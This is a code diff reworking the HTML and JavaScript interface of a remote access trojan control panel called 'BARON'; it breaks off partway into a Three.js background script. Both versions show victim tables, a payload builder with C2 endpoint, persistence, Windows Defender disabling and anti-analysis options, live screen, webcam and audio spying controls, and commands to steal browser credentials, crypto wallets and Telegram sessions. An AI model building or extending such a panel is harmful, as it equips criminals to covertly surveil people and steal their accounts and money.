-  .modal{background:var(--bg1);border:1px solid var(--border);border-radius:20px;padding:32px;
-    width:560px;max-height:80vh;overflow-y:auto;box-shadow:0 30px 80px rgba(0,0,0,.8)}
-  .modal-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px}
-  .modal-title{font-size:1.1rem;font-weight:700}
-  .modal-close{background:none;border:none;color:var(--text-dim);font-size:1.5rem;cursor:pointer;line-height:1}
-  .modal-close:hover{color:var(--red)}
-
-  /* ─── Pages ─── */
-  .page{display:none}
-  .page.active{display:flex;flex-direction:column;gap:24px}
-
-  /* ─── Streams ─── */
-  .stream-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
-  .stream-card{border-radius:14px;overflow:hidden;background:#000;border:1px solid var(--border);aspect-ratio:16/9;
-    display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
-  .stream-card img{width:100%;height:100%;object-fit:contain}
-  .stream-placeholder{color:var(--text-dim);font-size:.85rem;text-align:center;padding:20px}
-  .stream-controls{position:absolute;bottom:10px;right:10px;display:flex;gap:6px}
-
-  @keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-  @keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
-  .spin{animation:spin 1s linear infinite}
+/* ─── Login Screen ─── */
+#login { position:fixed; inset:0; z-index:9000; background:rgba(0,0,0,0.8); backdrop-filter:blur(50px); display:flex; align-items:center; justify-content:center; transition:0.8s; }
+.login-box { width:420px; text-align:center; animation:fadeUp 0.8s cubic-bezier(0.16,1,0.3,1); }
+@keyframes fadeUp { 0%{opacity:0;transform:translateY(40px) scale(0.95);} 100%{opacity:1;transform:translateY(0) scale(1);} }
+.login-title { font-size:3rem; font-weight:900; letter-spacing:15px; margin-bottom:10px; background:linear-gradient(to bottom, #fff, var(--gold)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; text-shadow:0 10px 30px var(--gold-glow); }
 </style>
 </head>
 <body>
-<div class="canvas"></div>
-<div class="grid-bg"></div>
 
-<!-- LOGIN -->
+<!-- Background -->
+<div id="three-canvas"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<!-- Login -->
 <div id="login">
-  <div class="login-wrap">
-    <div class="login-card">
-      <div class="login-logo">BARON</div>
-      <div class="login-sub">Sovereign Edition · v5.0</div>
-      <input class="inp" id="u" type="text" placeholder="Login" autocomplete="off">
-      <input class="inp" id="p" type="password" placeholder="Password">
-      <button class="btn-login" id="loginBtn" onclick="doLogin()">AUTHORIZE ›</button>
-      <div class="err" id="loginErr"></div>
-    </div>
+  <div class="login-box panel" style="padding:50px;">
+    <div class="login-title">BARON</div>
+    <div style="font-size:0.7rem; letter-spacing:6px; color:var(--gold); margin-bottom:40px; text-transform:uppercase;">Absolute Control</div>
+    <input type="text" id="u" class="input" placeholder="ACCESS IDENTITY" style="margin-bottom:16px; text-align:center; letter-spacing:2px;">
+    <input type="password" id="p" class="input" placeholder="PASSPHRASE" style="margin-bottom:30px; text-align:center; letter-spacing:2px;">
+    <button class="btn btn-prime" onclick="doLogin()" style="width:100%; padding:16px; font-size:1rem; letter-spacing:4px;">INITIALIZE HUD</button>
+    <div id="login-err" style="color:var(--red); font-size:0.8rem; margin-top:20px; height:20px;"></div>
   </div>
 </div>
 
-<!-- SHELL -->
-<div id="shell">
-  <!-- Sidebar -->
-  <aside class="sidebar">
-    <div class="sbar-top">
-      <div class="sbar-logo">BARON</div>
-      <div class="sbar-ver">SOVEREIGN EDITION · v5.0</div>
-      <div class="sbar-status"><span class="dot"></span><span id="srv-status">Server Online</span></div>
+<!-- Main HUD -->
+<div id="hud">
+  
+  <!-- Left Nav -->
+  <aside class="panel" id="left-panel">
+    <div class="brand">
+      <div class="brand-logo">BARON</div>
+      <div class="brand-sub">God Mode V2</div>
     </div>
-    <nav class="nav">
-      <div class="nav-label">Operations</div>
-      <div class="nav-item active" data-page="dashboard" onclick="nav(this,'dashboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>Dashboard
+    <div class="nav">
+      <div class="nav-item active" onclick="nav(this,'dashboard')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+        Command Center
       </div>
-      <div class="nav-item" data-page="clients" onclick="nav(this,'clients')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>Agents
+      <div class="nav-item" onclick="nav(this,'agents')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+        Global Grid
       </div>
-      <div class="nav-item" data-page="builder" onclick="nav(this,'builder')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>Builder
+      <div class="nav-item" onclick="nav(this,'builder')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+        Forge (Builder)
       </div>
-      <div class="nav-label">Intel</div>
-      <div class="nav-item" data-page="streams" onclick="nav(this,'streams')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>Streams
+      <div class="nav-item" onclick="nav(this,'streams')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg>
+        Live Intel
       </div>
-      <div class="nav-item" data-page="files" onclick="nav(this,'files')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>Files
+    </div>
+    <div class="left-footer">
+      <div class="theme-picker">
+        <div class="theme-dot" style="background:#D4AF37" onclick="setTheme('gold')"></div>
+        <div class="theme-dot" style="background:#00e5ff" onclick="setTheme('sapphire')"></div>
+        <div class="theme-dot" style="background:#00ff88" onclick="setTheme('emerald')"></div>
+        <div class="theme-dot" style="background:#ff3b5c" onclick="setTheme('ruby')"></div>
+        <div class="theme-dot" style="background:#b05bff" onclick="setTheme('amethyst')"></div>
       </div>
-      <div class="nav-item" data-page="logs" onclick="nav(this,'logs')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>Logs
-      </div>
-    </nav>
-    <div class="sbar-bot">
-      <div class="usr-card">
-        <div class="usr-av" id="usr-av">A</div>
-        <div><div class="usr-name" id="usr-name">—</div><div class="usr-role" id="usr-role">Loading…</div></div>
-      </div>
-      <button class="btn-logout" onclick="logout()">⏻ Disconnect</button>
+      <button class="btn btn-ghost" style="width:100%; border-color:transparent; color:var(--red);" onclick="logout()">DISCONNECT</button>
     </div>
   </aside>
 
-  <!-- Main -->
-  <main class="main">
-    <div class="sovereign-wrapper">
-      <div class="sovereign-island" id="sv-island" onclick="toggleIsland()">
-        <div class="isl-left">
-          <div class="pg-title" id="pg-title">Dashboard</div>
-        </div>
-        <div class="isl-center" id="isl-center">
-          <span class="isl-info">System Operational</span>
-        </div>
-        <div class="isl-right">
-          <div class="theme-picker">
-            <div class="theme-dot" style="background:#d4af37" onclick="setTheme('gold', event)"></div>
-            <div class="theme-dot" style="background:#2f80ed" onclick="setTheme('sapphire', event)"></div>
-            <div class="theme-dot" style="background:#2ed573" onclick="setTheme('emerald', event)"></div>
-            <div class="theme-dot" style="background:#ff4757" onclick="setTheme('ruby', event)"></div>
-            <div class="theme-dot" style="background:#9b59b6" onclick="setTheme('amethyst', event)"></div>
-          </div>
-          <div class="time-chip" id="clock">00:00</div>
+  <!-- Center Stage -->
+  <main id="center-stage">
+    <div class="cs-header">
+      <div class="pg-title" id="pg-title">Command Center</div>
+      <div class="cs-header-info">
+        <button class="btn btn-ghost" onclick="fetchAll()">SYNCHRONIZE</button>
+        <div class="time-chip" id="clock">00:00:00</div>
+      </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="page-dashboard" class="page active">
+      <div class="stat-grid" id="stats-container">
+        <div class="stat-card" draggable="true"><div class="stat-title">Connected Nodes</div><div class="stat-val" id="s-total">0</div></div>
+        <div class="stat-card" draggable="true"><div class="stat-title">Active Links</div><div class="stat-val" id="s-online" style="color:var(--green)">0</div></div>
+        <div class="stat-card" draggable="true"><div class="stat-title">Payloads Sent</div><div class="stat-val" id="s-tasks">0</div></div>
+        <div class="stat-card" draggable="true"><div class="stat-title">System Uptime</div><div class="stat-val" id="s-uptime">0h</div></div>
+      </div>
+      <div class="glass-box" style="flex:1;">
+        <div class="box-title">Active Deployments <span class="pill pill-on" id="badge-online"><span class="dot"></span>0 ONLINE</span></div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Node ID</th><th>Hostname</th><th>OS</th><th>Subnet IP</th><th>Status</th><th>Uplink</th></tr></thead>
+            <tbody id="client-table"><tr><td colspan="6" style="text-align:center; color:var(--text-dim); padding:40px;">No Active Nodes</td></tr></tbody>
+          </table>
         </div>
       </div>
     </div>
 
-    <div class="content">
-
-      <!-- DASHBOARD -->
-      <div id="page-dashboard" class="page active">
-        <div class="stats-grid">
-          <div class="stat"><div class="stat-label">Total Agents</div><div class="stat-val" id="s-total">0</div><div class="stat-hint">All registered</div></div>
-          <div class="stat"><div class="stat-label">Online Now</div><div class="stat-val" id="s-online">0</div><div class="stat-hint">Last 5 minutes</div></div>
-          <div class="stat"><div class="stat-label">Tasks Sent</div><div class="stat-val" id="s-tasks">0</div><div class="stat-hint">Total dispatched</div></div>
-          <div class="stat"><div class="stat-label">Uptime</div><div class="stat-val" id="s-uptime">0h</div><div class="stat-hint">Server running</div></div>
-        </div>
-        <div id="alert-wrap"></div>
-        <div class="card">
-          <div class="card-head"><span class="card-title">Active Deployments</span><span class="card-badge pill pill-green" id="badge-online">0 online</span></div>
-          <div class="card-body" style="padding:0">
-            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>IP Address</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr></thead>
-            <tbody id="client-table"><tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr></tbody></table></div>
-          </div>
+    <!-- Agents Grid -->
+    <div id="page-agents" class="page">
+      <div class="glass-box" style="flex:1;">
+        <div class="box-title">Global Grid Database</div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Node ID</th><th>Machine</th><th>Target User</th><th>Ext_IP</th><th>Location</th><th>Defenses</th><th>Status</th></tr></thead>
+            <tbody id="agent-table"><tr><td colspan="7" style="text-align:center; color:var(--text-dim); padding:40px;">Database Empty</td></tr></tbody>
+          </table>
         </div>
       </div>
+    </div>
 
-      <!-- CLIENTS (same as dashboard table but bigger) -->
-      <div id="page-clients" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Agent Registry</span></div>
-          <div class="card-body" style="padding:0">
-            <div class="tbl-wrap"><table><thead><tr><th>ID</th><th>Hostname</th><th>OS</th><th>User</th><th>IP</th><th>Country</th><th>AV</th><th>Status</th><th>Actions</th></tr></thead>
-            <tbody id="agent-table"><tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr></tbody></table></div>
+    <!-- Builder -->
+    <div id="page-builder" class="page">
+      <div class="glass-box">
+        <div class="box-title">Payload Forge</div>
+        <div style="display:flex; gap:40px;">
+          <div style="flex:1; display:flex; flex-direction:column; gap:20px;">
+            <div><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px; text-transform:uppercase;">C2 Endpoint</label><input type="text" id="b-server" class="input" placeholder="https://domain.com"></div>
+            <div><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px; text-transform:uppercase;">Payload Name</label><input type="text" id="b-name" class="input" value="svchost"></div>
+            <div style="display:flex; gap:20px;">
+              <div style="flex:1"><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px;">Type</label><select id="b-type" class="input" style="cursor:pointer;"><option value="exe">Executable (.exe)</option><option value="source">C# Source (.cs)</option></select></div>
+              <div style="flex:1"><label style="font-size:0.75rem; color:var(--gold); letter-spacing:2px;">Beacon (ms)</label><input type="number" id="b-beacon" class="input" value="5000"></div>
+            </div>
+            <div style="margin-top:20px;"><button class="btn btn-prime" style="width:100%;" onclick="buildAgent()">FORGE PAYLOAD</button></div>
+          </div>
+          <div style="flex:1; background:rgba(0,0,0,0.5); border-radius:16px; padding:24px; border:1px solid rgba(255,255,255,0.05);">
+            <div style="font-size:0.8rem; letter-spacing:3px; color:var(--gold); margin-bottom:16px; text-transform:uppercase;">Mutations</div>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Hidden Window</span><input type="checkbox" id="b-hidden" checked></label>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Registry Persistence</span><input type="checkbox" id="b-persist"></label>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Anti-Kill Watchdog</span><input type="checkbox" id="b-antikill"></label>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Disable Defender</span><input type="checkbox" id="b-defender"></label>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span>Anti-Analysis (VM)</span><input type="checkbox" id="b-antianalysis"></label>
+            <label style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px; cursor:pointer;"><span style="color:var(--gold);">Debug Mode</span><input type="checkbox" id="b-debug"></label>
           </div>
         </div>
-      </div>
-
-      <!-- BUILDER -->
-      <div id="page-builder" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Payload Builder</span><span class="card-badge pill" style="background:var(--gold-dim);color:var(--gold);border:1px solid var(--border)">C# / .NET</span></div>
-          <div class="card-body">
-            <div class="builder-grid">
-              <div>
-                <div class="form-group"><label class="form-label">C2 Server URL</label><input class="form-input" id="b-server" type="text" placeholder="https://your-app.onrender.com"></div>
-                <div class="form-group"><label class="form-label">Agent Name</label><input class="form-input" id="b-name" type="text" value="svchost" placeholder="Process name"></div>
-                <div class="form-group"><label class="form-label">Beacon Interval (ms)</label><input class="form-input" id="b-beacon" type="number" value="5000"></div>
-                <div class="form-group"><label class="form-label">Output Format</label>
-                  <select class="form-select" id="b-type"><option value="exe">EXE (Executable)</option><option value="source">Source Code (C#)</option></select>
-                </div>
-              </div>
-              <div>
-                <div style="margin-bottom:16px;font-size:.72rem;letter-spacing:2px;color:var(--gold);text-transform:uppercase">Options</div>
-                <div class="toggle-row"><div><div class="toggle-label">Hidden Window</div><div class="toggle-sub">Run without visible window</div></div><input type="checkbox" id="b-hidden" checked></div>
-                <div class="toggle-row"><div><div class="toggle-label">Persistence</div><div class="toggle-sub">Registry / Startup folder</div></div><input type="checkbox" id="b-persist"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Anti-Kill</div><div class="toggle-sub">Watchdog process</div></div><input type="checkbox" id="b-antikill"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Defender Disable</div><div class="toggle-sub">Windows Defender bypass</div></div><input type="checkbox" id="b-defender"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Fake Error</div><div class="toggle-sub">Show fake error on start</div></div><input type="checkbox" id="b-fakeerr"></div>
-                <div class="toggle-row"><div><div class="toggle-label">Anti-Analysis</div><div class="toggle-sub">VM/Sandbox/Debugger detection</div></div><input type="checkbox" id="b-antianalysis"></div>
-                <div class="toggle-row"><div><div class="toggle-label" style="color:var(--gold)">Debug Mode</div><div class="toggle-sub">Show console with full logs</div></div><input type="checkbox" id="b-debug"></div>
-              </div>
-            </div>
-            <div style="margin-top:24px;display:flex;gap:12px">
-              <button class="btn btn-gold" onclick="buildAgent()">⚡ Build Payload</button>
-              <button class="btn btn-outline" onclick="clearBuildOut()">Clear</button>
-            </div>
-            <div id="build-out" style="margin-top:20px;display:none">
-              <div class="terminal">
-                <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div><span style="margin-left:8px;font-size:.75rem;color:var(--text-dim)">Build Output</span></div>
-                <div class="term-body" id="build-src" style="height:300px;color:#a8e6a8;white-space:pre;overflow:auto"></div>
-              </div>
-              <div style="margin-top:12px"><button class="btn btn-gold btn-sm" onclick="downloadBuild()">⬇ Download</button></div>
-            </div>
+        <div id="build-out" style="display:none; margin-top:30px;">
+          <div class="terminal">
+            <div class="term-bar"><div class="term-dot" style="background:#ff3b5c"></div><div class="term-dot" style="background:#D4AF37"></div><div class="term-dot" style="background:#00ff88"></div><span style="font-size:0.7rem; color:var(--text-dim); margin-left:10px;">Compiler Output</span></div>
+            <div class="term-body" id="build-src" style="height:250px;"></div>
           </div>
+          <button class="btn btn-prime" style="margin-top:16px;" onclick="downloadBuild()">DOWNLOAD TARGET</button>
         </div>
       </div>
+    </div>
 
-      <!-- STREAMS -->
-      <div id="page-streams" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Live Streams</span>
-            <select class="form-select" id="stream-cid" style="width:auto;padding:6px 10px;font-size:.8rem">
-              <option value="">— Select Agent —</option>
-            </select>
-          </div>
-          <div class="card-body">
-            <div class="stream-grid">
-              <div class="stream-card" id="screen-frame"><div class="stream-placeholder">🖥 Screen<br><small>Start stream to view</small></div></div>
-              <div class="stream-card" id="webcam-frame"><div class="stream-placeholder">📷 Webcam<br><small>Start stream to view</small></div></div>
-            </div>
-            <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
-              <button class="btn btn-gold btn-sm" onclick="sendStream('screen_start')">▶ Screen</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('screen_stop')">■ Stop Screen</button>
-              <button class="btn btn-gold btn-sm" onclick="sendStream('webcam_start')">▶ Webcam</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('webcam_stop')">■ Stop Webcam</button>
-              <button class="btn btn-gold btn-sm" onclick="sendStream('audio_start')">🔊 Audio</button>
-              <button class="btn btn-outline btn-sm" onclick="sendStream('audio_stop')">■ Stop Audio</button>
-            </div>
-          </div>
+    <!-- Streams -->
+    <div id="page-streams" class="page">
+      <div class="glass-box">
+        <div class="box-title">Live Intel Streams 
+          <select id="stream-cid" class="input" style="width:auto; padding:8px 16px; border-radius:30px;"><option value="">— Select Node —</option></select>
+        </div>
+        <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+          <div style="background:#000; border:1px solid var(--border); border-radius:16px; height:300px; display:flex; align-items:center; justify-content:center; color:var(--text-dim); overflow:hidden;" id="screen-frame">Desktop Feed</div>
+          <div style="background:#000; border:1px solid var(--border); border-radius:16px; height:300px; display:flex; align-items:center; justify-content:center; color:var(--text-dim); overflow:hidden;" id="webcam-frame">Optical Feed</div>
+        </div>
+        <div style="margin-top:20px; display:flex; gap:12px; flex-wrap:wrap;">
+          <button class="btn btn-ghost" onclick="sendStream('screen_start')">INIT SCREEN</button>
+          <button class="btn btn-danger" onclick="sendStream('screen_stop')">HALT SCREEN</button>
+          <button class="btn btn-ghost" onclick="sendStream('webcam_start')">INIT OPTICS</button>
+          <button class="btn btn-danger" onclick="sendStream('webcam_stop')">HALT OPTICS</button>
+          <button class="btn btn-prime" onclick="sendStream('audio_start')">INIT AUDIO</button>
+          <button class="btn btn-danger" onclick="sendStream('audio_stop')">HALT AUDIO</button>
         </div>
       </div>
+    </div>
 
-      <!-- FILES -->
-      <div id="page-files" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">File Manager</span></div>
-          <div class="card-body">
-            <div style="display:flex;gap:12px;margin-bottom:20px">
-              <input class="form-input" id="file-path" placeholder="C:\Users\..." style="flex:1">
-              <button class="btn btn-gold" onclick="listFiles()">Browse</button>
-              <button class="btn btn-outline" onclick="uploadModal()">Upload</button>
-            </div>
-            <div class="terminal">
-              <div class="term-bar"><div class="term-dot" style="background:#ff5f57"></div><div class="term-dot" style="background:#febc2e"></div><div class="term-dot" style="background:#28c840"></div></div>
-              <div class="term-body" id="file-out">Select an agent and browse a directory…</div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- LOGS -->
-      <div id="page-logs" class="page">
-        <div class="card">
-          <div class="card-head"><span class="card-title">Server Logs</span><button class="btn btn-outline btn-sm" onclick="fetchLogs()">⟳</button></div>
-          <div class="card-body" id="log-body" style="max-height:70vh;overflow-y:auto"></div>
-        </div>
-      </div>
-
-    </div><!-- content -->
   </main>
-</div><!-- CONTEXT MENU -->
-<div id="ctx-menu" onclick="event.stopPropagation()">
-  <div class="ctx-header" id="ctx-target">AGENT ID</div>
-  <div class="ctx-item" onclick="ctxCmd('info')">⚙️ SysInfo</div>
-  <div class="ctx-item" onclick="ctxCmd('browsers')">🔑 Browser Creds</div>
-  <div class="ctx-item" onclick="ctxCmd('netscan')">🌐 NetScan</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">Streams</div>
-  <div class="ctx-item" onclick="ctxCmd('screen_start')">🖥 View Screen</div>
-  <div class="ctx-item" onclick="ctxCmd('webcam_start')">📷 View Webcam</div>
-  <div class="ctx-item" onclick="ctxCmd('audio_start')">🔊 Listen Audio</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-header">Actions</div>
-  <div class="ctx-item" onclick="ctxCmd('persist_install')">🛡️ Install Persist</div>
-  <div class="ctx-item" onclick="openAgent(SELECTED_CID); hideCtx()">💻 Open Shell / Terminal</div>
-  <div class="ctx-divider"></div>
-  <div class="ctx-item danger" onclick="ctxCmd('kill')">☠️ Kill Process</div>
-  <div class="ctx-item danger" onclick="ctxCmd('uninstall')">🗑️ Uninstall Agent</div>
+
+  <!-- Right Panel: Logs -->
+  <aside class="panel" id="right-panel">
+    <div class="rp-header">System Telemetry</div>
+    <div class="log-stream" id="log-body">
+      <!-- Logs populate here -->
+      <div style="text-align:center; color:var(--text-dim); margin-top:50px;">Awaiting telemetry...</div>
+    </div>
+  </aside>
+
 </div>
 
-<!-- MODAL -->
-<div id="modal-overlay" onclick="if(event.target===this)closeModal()">
-  <div class="modal" id="modal-box">
-    <div class="modal-head">
-      <div class="modal-title" id="modal-title">Agent Control</div>
-      <button class="modal-close" onclick="closeModal()">×</button>
+<!-- Context Menu -->
+<div id="ctx-menu">
+  <div class="ctx-header">Node: <span id="ctx-cid" style="color:#fff;"></span></div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-item" onclick="ctxCmd('sysinfo')">Get System Info</div>
+  <div class="ctx-item" onclick="ctxCmd('netscan')">Scan Local Subnet</div>
+  <div class="ctx-item" onclick="ctxCmd('browser_creds')">Extract Vault / Browsers</div>
+  <div class="ctx-item" onclick="ctxCmd('crypto_wallet')">Extract Crypto Wallets</div>
+  <div class="ctx-item" onclick="ctxCmd('telegram')">Extract Telegram Session</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">C2 Link</div>
+  <div class="ctx-item" onclick="nav(document.querySelector('[onclick=\'nav(this,\\\'streams\\\')\']'), 'streams')">Initialize Stream / Audio</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-item ctx-danger" onclick="ctxCmd('uninstall')">Purge / Uninstall Payload</div>
+  <div class="ctx-item ctx-danger" onclick="ctxCmd('kill_agent')">Sever Connection (Kill)</div>
+</div>
+
+<!-- Modal (Legacy Alerts and Terminals) -->
+<div id="modal-overlay" style="position:fixed; inset:0; z-index:9500; background:rgba(0,0,0,0.8); backdrop-filter:blur(20px); display:none; align-items:center; justify-content:center;">
+  <div class="panel" style="width:700px; padding:30px;">
+    <div style="display:flex; justify-content:space-between; margin-bottom:20px;">
+      <h3 id="modal-title" style="color:var(--gold);">Terminal Control</h3>
+      <button class="btn btn-ghost" style="padding:4px 12px;" onclick="closeModal()">X</button>
     </div>
     <div id="modal-body"></div>
   </div>
 </div>
 
 <script>
-const API = '';
-let TOKEN = localStorage.getItem('bt') || '';
-let SESSION = null;
-let CLIENTS = {};
-let SELECTED_CID = null;
-let BUILD_DATA = null;
-let socket = null;
+// ─── Three.js 3D Cyber Web Background ───
+let scene, camera, renderer, particles;
+function init3D() {
+  scene = new THREE.Scene();
+  scene.fog = new THREE.FogExp2(0x020305, 0.001);
+  camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 1, 2000);
+  camera.position.z = 1000;
+  renderer = new THREE.WebGLRenderer({ alpha:true, antialias:true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  document.getElementById('three-canvas').appendChild(renderer.domElement);
 
-// ── Clock
-setInterval(() => {
-  document.getElementById('clock').textContent = new Date().toLocaleTimeString('ru-RU');
-}, 1000);
-
-// ── Init
-if (TOKEN) init();
-
-async function doLogin() {
-  const u = document.getElementById('u').value.trim();
-  const p = document.getElementById('p').value;
-  const btn = document.getElementById('loginBtn');
-  btn.textContent = '…'; btn.disabled = true;
-  const r = await fetch('/api/panel/login', {
-    method: 'POST', headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({login:u, password:p})
-  }).catch(() => null);
-  btn.textContent = 'AUTHORIZE ›'; btn.disabled = false;
-  if (!r) return err('Connection failed');
-  const d = await r.json();
-  if (d.ok) { TOKEN = d.token; SESSION = d; localStorage.setItem('bt', TOKEN); init(); }
-  else err(d.error || 'Auth failed');
-}
-
-function err(m) { document.getElementById('loginErr').textContent = m; }
-
-function init() {
-  const l = document.getElementById('login');
-  l.style.opacity = '0'; l.style.pointerEvents = 'none';
-  setTimeout(() => l.style.display = 'none', 700);
-  document.getElementById('shell').style.display = 'grid';
-  if (SESSION) showUser(SESSION);
-  else checkSession();
-  fetchAll();
-  setInterval(fetchAll, 8000);
-  initSocket();
-}
-
-async function checkSession() {
-  const r = await apiFetch('/api/panel/check');
-  if (r && r.ok) { SESSION = r; showUser(r); }
-  else { logout(); }
-}
-
-function showUser(s) {
-  document.getElementById('usr-name').textContent = s.user || '?';
-  document.getElementById('usr-role').textContent = s.admin ? 'Administrator' : 'Operator';
-  document.getElementById('usr-av').textContent = (s.user||'?')[0].toUpperCase();
-}
-
-// ── Theming & Sovereign Island
-const savedTheme = localStorage.getItem('baron-theme');
-if (savedTheme) document.documentElement.setAttribute('data-theme', savedTheme);
-
-function setTheme(name, e) {
-  if (e) e.stopPropagation();
-  document.documentElement.setAttribute('data-theme', name);
-  localStorage.setItem('baron-theme', name);
-}
-
-let islandTid = null;
-function toggleIsland() {
-  const isl = document.getElementById('sv-island');
-  if(!isl) return;
-  isl.classList.toggle('expanded');
-  if (isl.classList.contains('expanded')) {
-     clearTimeout(islandTid);
-     islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 5000);
+  const geometry = new THREE.BufferGeometry();
+  const vertices = [];
+  for(let i=0; i<1500; i++){
+    vertices.push((Math.random()-0.5)*3000, (Math.random()-0.5)*3000, (Math.random()-0.5)*3000);
   }
-}
+  geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
+  
+  // Custom texture for glow
+  const canvas = document.createElement('canvas'); canvas.width = 16; canvas.height = 16;
+  const ctx = canvas.getContext('2d');
+  const gradient = ctx.createRadialGradient(8,8,0,8,8,8);
+  gradient.addColorStop(0, 'rgba(255,255,255,1)'); gradient.addColorStop(1, 'rgba(255,255,255,0)');
+  ctx.fillStyle = gradient; ctx.fillRect(0,0,16,16);
+  const texture = new THREE.CanvasTexture(canvas);
 
-function islandNotify(msg, color) {
-  const isl = document.getElementById('sv-island');
-  const ic = document.getElementById('isl-center');
-  if(!isl || !ic) return;
-  ic.innerHTML = `<span style="color:${color||'var(--gold)'}">${msg}</span>`;
-  isl.classList.add('expanded');
-  clearTimeout(islandTid);
-  islandTid = setTimeout(() => { isl.classList.remove('expanded'); }, 4000);
+  const material = new THREE.PointsMaterial({
+    size: 20, map: texture, transparent: true, opacity: 0.6,
+    blending: THREE.AdditiveBlending, depthWrite: false, color: 0xD4AF37
+  });
+  particles = new THREE.Points(geometry, material);
+  scene.add(particles);
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth/window.innerHeight; camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+  
+  let mouseX = 0, mouseY = 0;
+  document.addEventListener('mousemove', e => {
